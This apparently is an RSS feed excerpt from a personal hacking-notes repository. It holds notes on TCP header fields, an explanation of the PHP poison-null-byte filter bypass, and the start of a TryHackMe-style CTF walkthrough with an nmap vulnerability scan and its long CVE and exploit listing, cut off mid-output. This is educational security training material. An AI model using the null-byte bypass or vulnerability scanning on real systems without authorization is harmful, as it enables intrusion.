			<description>&lt;p&gt;The &quot;Transmission Control Protocol&quot;. TCP was formalized in September 1981 in RFC793.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc793.html&quot;&gt;Transmission Control Protocol (RFC 793)&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./TCP%20Model.md&quot;&gt;TCP Model&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flags&quot;&gt;Flags&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;URG - Process the current TCP packet immediately. Directs the receiving system to examine the &quot;urgent pointer&quot; field.&lt;/li&gt;&lt;li&gt;ACK - Acknowledgement. Directs the receiving system to examine the &quot;acknowledgement number&quot; field.&lt;/li&gt;&lt;li&gt;PSH - Push. Elevate the priority of the packet's data, but does not otherwise change rules around packet processing.&lt;/li&gt;&lt;li&gt;RST - Reset. Terminates the connection forcefully.&lt;/li&gt;&lt;li&gt;SYN - Synchronize. Used during the initial three-way handshake to set a shared (starting) sequence number.&lt;/li&gt;&lt;li&gt;FIN - Finish. Indicates that the connection may be dropped gracefully.&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;acknowledgement-number&quot;&gt;Acknowledgement Number&lt;/h2&gt;&lt;p&gt;The TCP &quot;acknowledgment number&quot; contains the &lt;em&gt;next&lt;/em&gt; sequence number that the sender is expecting to receive (so basically senders determine the next sequence number). This is the current sequence number (for the other host) + the number of bytes in the data segment of the packet being sent to that host.&lt;/p&gt;&lt;p&gt;Packets with a zero-length data segment that start or continue a conversation (for example, SYN packets) get their sequence/acknowledgement number incremented by 1. This is called a &quot;ghost byte&quot;.&lt;/p&gt;&lt;p&gt;The acknowledgement number for RST packets is always 0.&lt;/p&gt;&lt;p&gt;The initial SYN packet that starts the three-way handshake should &lt;em&gt;not&lt;/em&gt; have an acknowledgement number&lt;/p&gt;&lt;h2 id=&quot;window-size&quot;&gt;Window Size&lt;/h2&gt;&lt;p&gt;The TCP &quot;Window&quot; is the maximum number of bits that the sending system expects to receive from a request (it represents the current buffer size for that connection on that system). This is a 2-byte number, such that the maximum (unscaled) window size if 65535 bytes.&lt;/p&gt;&lt;h2 id=&quot;tcp-options&quot;&gt;TCP Options&lt;/h2&gt;&lt;p&gt;TCP &quot;options&quot; are set in the initial handshake (the initiating host will propose in the SYN packet, and the receiving host will reply with what it supports in the SYN/ACK packet). Note that each system sets its own window scale and MSS values (but these value must be set by both hosts in order to be used in a connection).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Window Scale - Set the &lt;em&gt;multiplier&lt;/em&gt; for the window size (see above) as as a power of two - such that a &quot;Window scale&quot; of 7 is a multiplier of 2â· = 128. Window scales can be up to 14, which allows (once multiplied with the maximum window size) &lt;em&gt;up to&lt;/em&gt; 1 GB of data to be transmitted before an ACK is &lt;em&gt;required&lt;/em&gt;. Typically set to 2 for webservers, or to 0 for systems that wish to allow the use of this option in a conversation but don't support large buffers themselves.&lt;/li&gt;&lt;li&gt;Maximum Segment Size (MSS) - The maximum data segment size that a system can receive. This is different than the window size, which is the amount of data that a system expects before it gets an ACK (it's basically that system's buffer for this connection).&lt;/li&gt;&lt;li&gt;Selective Acknowledgement (SACK) - Allows for packets to be acknowledged as they are received, rather than at the end of a window. Using SACK allows for dropped packets to be retransmitted sooner, and prevents the retransmission of packets that were properly received &lt;em&gt;after&lt;/em&gt; a dropped packet. However, using SACK requires that the transmitting host keep track of what packets were sent in memory, which means that it's typically not set on resource-constrained systems (IoT, etc.).&lt;/li&gt;&lt;li&gt;No-Op (NOP) - A &quot;blank&quot; value (&lt;code&gt;01&lt;/code&gt;) used to pad out the options field, since header size must be a power of two &lt;em&gt;bytes&lt;/em&gt; but (1) each option need to fall on a byte boundary and (2) we may not have enough options to fill out the space requested. How NOPs are used is highly implementation-dependent. NOPs can also be used by middle-boxes (firewalls, routers, etc.) to &lt;em&gt;strip&lt;/em&gt; options.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If SACK is used, then acknowledge packet numbers are also placed in the options block.&lt;/p&gt;&lt;p&gt;Differences in how TCP options are responded to for incoming SYN packets or ordered for outgoing SYN/ACK packets are important for fingerprinting operating systems and TCP stacks.&lt;/p&gt;&lt;h2 id=&quot;initial-round-trip-time&quot;&gt;Initial Round Trip Time&lt;/h2&gt;&lt;p&gt;The &quot;initial round trip time&quot; (IRTT) is the time taken for the initial SYN packet in the TCP handshake to the final ACK packet in the initial three-way handshake. Most TCP implementations will &lt;em&gt;initially&lt;/em&gt; wait for up to 0.5 seconds until retransmitting a packet, but will dynamically adjust this to 3x - 4x the IRTT after the initial handshake. Wireshark will report the IRTT value in the final ACK packet of the three-way handshake.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Wireshark.md&quot;&gt;Using Wireshark&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/TCP%20Protocol.md</guid>
		</item>
		<item>
			<title>The Poison Null Byte</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/The%20Poison%20Null%20Byte.md</link>
			<description>&lt;p&gt;Some languages use null bytes (&lt;code&gt;0x00&lt;/code&gt;) to know when a string terminates, rather than tracking the actual string length (PHP &amp;lt; 5.3.4 is one of these). If a null byte (generally? always? encoded as %00) is included in a string, then everything after that byte is dropped by the interpreter.&lt;/p&gt;&lt;p&gt;Because % characters are themselves special, null bytes need to be encoded in URLs as %2500.&lt;/p&gt;&lt;p&gt;Typically a null byte will either be inserted at the end of a string (to prevent a suffix from being appended or bypass simple path filters) or before a &quot;fake&quot; file extensions (which can cause some file-type checks to pass, again allowing us to download files we'd otherwise be denied access to).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/beginner&quot;&gt;TryHackMe: Complete Beginner&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://defendtheweb.net/article/common-php-attacks-poison-null-byte&quot;&gt;Common PHP attacks: Poison Null Byte&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/path/outline/jrpenetrationtester&quot;&gt;TryHackMe: Jr. Penetration Tester&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/The%20Poison%20Null%20Byte.md</guid>
		</item>
		<item>
			<title>Tools'R'us</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Tools%27R%27us.md</link>
			<description>&lt;p&gt;We're supposed to restrict ourselves to the following tools in this CTF:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;dirbuster&lt;/li&gt;&lt;li&gt;Hydra&lt;/li&gt;&lt;li&gt;nmap&lt;/li&gt;&lt;li&gt;Nikto&lt;/li&gt;&lt;li&gt;Metasploit&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;It's been a little while since I had the chance to use some of these, so let's find out how rusty I am!&lt;/p&gt;&lt;h2 id=&quot;narrative&quot;&gt;Narrative&lt;/h2&gt;&lt;p&gt;The target is at 10.10.28.154. Visiting &lt;a href=&quot;http://10.10.28.154&quot;&gt;http://10.10.28.154&lt;/a&gt; reveals a &quot;down for maintenance&quot; page with no other links, but with the cryptic promise that &quot;[o]ther parts of ther website is [sic] still functionalâ¦&quot;&lt;/p&gt;&lt;p&gt;We'll start off with an nmap scan.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.28.154&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives the following output:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan 30 15:52:33 2022 as: nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.28.154
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.2p2: 
|       PACKETSTORM:140070  7.8 https://vulners.com/packetstorm/PACKETSTORM:140070  *EXPLOIT*
|       EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    7.8 https://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09    *EXPLOIT*
|       EDB-ID:40888    7.8 https://vulners.com/exploitdb/EDB-ID:40888  *EXPLOIT*
|       CVE-2016-8858   7.8 https://vulners.com/cve/CVE-2016-8858
|       CVE-2016-6515   7.8 https://vulners.com/cve/CVE-2016-6515
|       1337DAY-ID-26494    7.8 https://vulners.com/zdt/1337DAY-ID-26494    *EXPLOIT*
|       SSV:92579   7.5 https://vulners.com/seebug/SSV:92579    *EXPLOIT*
|       CVE-2016-10009  7.5 https://vulners.com/cve/CVE-2016-10009
|       1337DAY-ID-26576    7.5 https://vulners.com/zdt/1337DAY-ID-26576    *EXPLOIT*
|       SSV:92582   7.2 https://vulners.com/seebug/SSV:92582    *EXPLOIT*
|       CVE-2016-10012  7.2 https://vulners.com/cve/CVE-2016-10012
|       CVE-2015-8325   7.2 https://vulners.com/cve/CVE-2015-8325
|       SSV:92580   6.9 https://vulners.com/seebug/SSV:92580    *EXPLOIT*
|       CVE-2016-10010  6.9 https://vulners.com/cve/CVE-2016-10010
|       1337DAY-ID-26577    6.9 https://vulners.com/zdt/1337DAY-ID-26577    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2019-25017/    5.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/  5.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/ *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/  *EXPLOIT*
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/    *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/  *EXPLOIT*
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8 https://vulners.com/exploitdb/EDB-ID:46516  *EXPLOIT*
|       EDB-ID:46193    5.8 https://vulners.com/exploitdb/EDB-ID:46193  *EXPLOIT*
|       CVE-2019-6111   5.8 https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328    5.8 https://vulners.com/zdt/1337DAY-ID-32328    *EXPLOIT*
|       1337DAY-ID-32009    5.8 https://vulners.com/zdt/1337DAY-ID-32009    *EXPLOIT*
|       SSV:91041   5.5 https://vulners.com/seebug/SSV:91041    *EXPLOIT*
|       PACKETSTORM:140019  5.5 https://vulners.com/packetstorm/PACKETSTORM:140019  *EXPLOIT*
|       PACKETSTORM:136234  5.5 https://vulners.com/packetstorm/PACKETSTORM:136234  *EXPLOIT*
|       EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    5.5 https://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F    *EXPLOIT*
|       EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    5.5 https://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138    *EXPLOIT*
|       EXPLOITPACK:1902C998CBF9154396911926B4C3B330    5.5 https://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330    *EXPLOIT*
|       EDB-ID:40858    5.5 https://vulners.com/exploitdb/EDB-ID:40858  *EXPLOIT*
|       EDB-ID:40119    5.5 https://vulners.com/exploitdb/EDB-ID:40119  *EXPLOIT*
|       EDB-ID:39569    5.5 https://vulners.com/exploitdb/EDB-ID:39569  *EXPLOIT*
|       CVE-2016-3115   5.5 https://vulners.com/cve/CVE-2016-3115
|       SSH_ENUM    5.0 https://vulners.com/canvas/SSH_ENUM *EXPLOIT*
|       PACKETSTORM:150621  5.0 https://vulners.com/packetstorm/PACKETSTORM:150621  *EXPLOIT*
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0 https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS  *EXPLOIT*
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0 https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    *EXPLOIT*
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0 https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    *EXPLOIT*
|       EDB-ID:45939    5.0 https://vulners.com/exploitdb/EDB-ID:45939  *EXPLOIT*
|       EDB-ID:45233    5.0 https://vulners.com/exploitdb/EDB-ID:45233  *EXPLOIT*
|       CVE-2018-15919  5.0 https://vulners.com/cve/CVE-2018-15919
|       CVE-2018-15473  5.0 https://vulners.com/cve/CVE-2018-15473
|       CVE-2017-15906  5.0 https://vulners.com/cve/CVE-2017-15906
|       CVE-2016-10708  5.0 https://vulners.com/cve/CVE-2016-10708
|       1337DAY-ID-31730    5.0 https://vulners.com/zdt/1337DAY-ID-31730    *EXPLOIT*
|       CVE-2021-41617  4.4 https://vulners.com/cve/CVE-2021-41617
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/ 4.3 https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/  4.3 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/   *EXPLOIT*
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3 https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/    *EXPLOIT*
|       EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF    *EXPLOIT*
|       EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    4.3 https://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF    *EXPLOIT*
|       EDB-ID:40136    4.3 https://vulners.com/exploitdb/EDB-ID:40136  *EXPLOIT*
|       EDB-ID:40113    4.3 https://vulners.com/exploitdb/EDB-ID:40113  *EXPLOIT*
|       CVE-2020-14145  4.3 https://vulners.com/cve/CVE-2020-14145
|       CVE-2016-6210   4.3 https://vulners.com/cve/CVE-2016-6210
|       1337DAY-ID-25440    4.3 https://vulners.com/zdt/1337DAY-ID-25440    *EXPLOIT*
|       1337DAY-ID-25438    4.3 https://vulners.com/zdt/1337DAY-ID-25438    *EXPLOIT*
|       CVE-2019-6110   4.0 https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0 https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6 https://vulners.com/cve/CVE-2018-20685
|       SSV:92581   2.1 https://vulners.com/seebug/SSV:92581    *EXPLOIT*
|       CVE-2016-10011  2.1 https://vulners.com/cve/CVE-2016-10011
|       SRC-2016-0002   0.0 https://vulners.com/srcincite/SRC-2016-0002 *EXPLOIT*
|       PACKETSTORM:151227  0.0 https://vulners.com/packetstorm/PACKETSTORM:151227  *EXPLOIT*
|       PACKETSTORM:140261  0.0 https://vulners.com/packetstorm/PACKETSTORM:140261  *EXPLOIT*
|       PACKETSTORM:138006  0.0 https://vulners.com/packetstorm/PACKETSTORM:138006  *EXPLOIT*
|       PACKETSTORM:137942  0.0 https://vulners.com/packetstorm/PACKETSTORM:137942  *EXPLOIT*
|_      1337DAY-ID-30937    0.0 https://vulners.com/zdt/1337DAY-ID-30937    *EXPLOIT*
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-enum: 
|_  /protected/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.18: 
|       CVE-2021-44790  7.5 https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5 https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5 https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5 https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5 https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5 https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5 https://vulners.com/cve/CVE-2017-3167
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/  7.2 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/   *EXPLOIT*
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2 https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
|       EDB-ID:46676    7.2 https://vulners.com/exploitdb/EDB-ID:46676  *EXPLOIT*
|       CVE-2019-0211   7.2 https://vulners.com/cve/CVE-2019-0211
|       1337DAY-ID-32502    7.2 https://vulners.com/zdt/1337DAY-ID-32502    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/SUSE-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/   6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/    *EXPLOIT*
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/FREEBSD-CVE-2017-15715/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/  *EXPLOIT*
|       MSF:ILITIES/DEBIAN-CVE-2017-15715/  6.8 https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/   *EXPLOIT*
|       MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/ *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/ 6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/  *EXPLOIT*
|       MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/    6.8 https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/ *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8 https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8 https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8 https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8 https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8 https://vulners.com/cve/CVE-2017-15715
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8 https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       CVE-2021-44224  6.4 https://vulners.com/cve/CVE-2021-44224
|       CVE-2019-10082  6.4 https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4 https://vulners.com/cve/CVE-2017-9788
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0 https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/  6.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/   *EXPLOIT*
|       CVE-2019-0217   6.0 https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8 https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8 https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577    5.8 https://vulners.com/zdt/1337DAY-ID-33577    *EXPLOIT*
|       CVE-2016-5387   5.1 https://vulners.com/cve/CVE-2016-5387
|       SSV:96537   5.0 https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2018-1303/   5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/    *EXPLOIT*
|       MSF:ILITIES/UBUNTU-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/   5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/    *EXPLOIT*
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/  5.0 https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/   *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/ 5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/  *EXPLOIT*
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/  5.0 https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/   *EXPLOIT*
